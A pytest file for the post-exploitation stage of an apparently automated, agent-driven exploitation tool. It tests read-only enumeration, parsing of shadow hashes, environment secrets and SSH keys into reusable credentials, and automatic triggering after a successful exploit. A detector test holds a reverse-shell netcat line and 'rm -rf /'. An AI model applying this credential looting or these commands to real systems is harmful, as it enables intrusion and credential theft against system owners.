"""Post-exploitation enumeration: bounded command set + loot parsing.

Two properties matter and are testable with no shell:
  * the enumeration command set is READ-ONLY — it enumerates/loots the box we
    already own, it does not attack further or change state;
  * the loot parser turns real /etc/passwd, /etc/shadow, env and ssh-key output
    into credential candidates for the reuse loop.

Pure stdlib module — imported directly, runs on a bare checkout.
"""
import importlib.util
import os
import pathlib

import pytest

REPO = pathlib.Path(__file__).resolve().parents[1]
MOD = REPO / "exploit_runner" / "postex.py"


def _load():
    if not MOD.exists():
        pytest.skip("postex.py not present")
    spec = importlib.util.spec_from_file_location("postex", MOD)
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m


px = _load()


def test_command_set_is_enumeration_only():
    for platform in ("linux", "windows"):
        for key, cmd in px.command_set(platform):
            bad = px.forbidden_tokens_in(cmd)
            assert not bad, f"{platform} enum cmd {key!r} has forbidden token(s) {bad}: {cmd!r}"


def test_forbidden_detector_flags_destructive():
    assert px.forbidden_tokens_in("rm -rf /") 
    assert px.forbidden_tokens_in("nc -e /bin/sh 1.2.3.4 9001")
    assert not px.forbidden_tokens_in("cat /etc/passwd")


def test_parse_loot_extracts_shadow_env_ssh_and_users():
    outputs = {
        "id": "uid=0(root) gid=0(root) groups=0(root)",
        "whoami": "root",
        "hostname": "victim01",
        "passwd": "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbob:x:1000:1000::/home/bob:/bin/bash\n",
        "shadow": "root:$6$abcd$deadbeefhashvalue:19000:0:99999:7:::\nbob:$6$xy$anotherhash:19000:0:99999:7:::\n",
        "env": "PATH=/usr/bin\nDB_PASSWORD=s3cr3t!\nHOME=/root\nAPI_KEY=abc123\n",
        "ssh_keys": "-----BEGIN OPENSSH PRIVATE KEY-----\nbase64keydata\n-----END OPENSSH PRIVATE KEY-----",
    }
    loot = px.parse_loot(outputs, host="10.0.0.5")
    assert loot["privileged"] is True
    assert set(loot["local_users"]) == {"root", "www-data", "bob"}
    kinds = {c["secret_type"] for c in loot["credentials"]}
    assert {"hash", "env", "ssh_key"} <= kinds
    # env secret captured with its value
    env = [c for c in loot["credentials"] if c["secret_type"] == "env"]
    assert any(c["secret_value"] == "s3cr3t!" for c in env)
    # two shadow hashes
    assert sum(1 for c in loot["credentials"] if c["secret_type"] == "hash") == 2


def test_parse_loot_unprivileged_when_no_root():
    loot = px.parse_loot({"id": "uid=33(www-data) gid=33(www-data)",
                          "whoami": "www-data", "passwd": "", "shadow": ""})
    assert loot["privileged"] is False
    assert loot["credentials"] == []


def test_parse_loot_never_raises_on_garbage():
    assert px.parse_loot({})["credentials"] == []
    assert px.parse_loot({"passwd": None, "env": None})["local_users"] == []


# ── auto-trigger safety (source-checked against the engine) ──────────────────
import ast as _ast

ENGINE = REPO / "autogen_agents" / "langgraph_engine.py"


def _engine():
    return ENGINE.read_text(encoding="utf-8")


def test_postex_fires_only_on_success():
    src = _engine()
    # both exec paths must guard the post-ex call behind `if success`
    assert src.count("_postex_enumerate(") >= 3, "post-ex must be wired into the exec paths"
    # the exec-result SELECTs must pull session_type/session_id
    assert src.count("session_type, session_id") >= 2, (
        "the exploit_results read must include session_type/session_id to target "
        "the shell")
    for fn in ("_exec_one_impactful", "surface_exec"):
        node = next((n for n in _ast.walk(_ast.parse(src))
                     if isinstance(n, _ast.FunctionDef) and n.name == fn), None)
        assert node is not None, f"{fn} missing"
        body = _ast.get_source_segment(src, node)
        assert "if success:" in body and "_postex_enumerate(" in body, (
            f"{fn} must only enumerate when the exploit succeeded")


def test_postex_helper_skips_non_shells():
    node = next((n for n in _ast.walk(_ast.parse(_engine()))
                if isinstance(n, _ast.FunctionDef) and n.name == "_postex_enumerate"), None)
    assert node is not None, "_postex_enumerate missing"
    body = _ast.get_source_segment(_engine(), node)
    assert '"web_poc"' in body and '"none"' in body, (
        "post-ex must skip non-shell results (web_poc / none)")
    assert "if not session_id" in body, "post-ex needs a live session id to target"
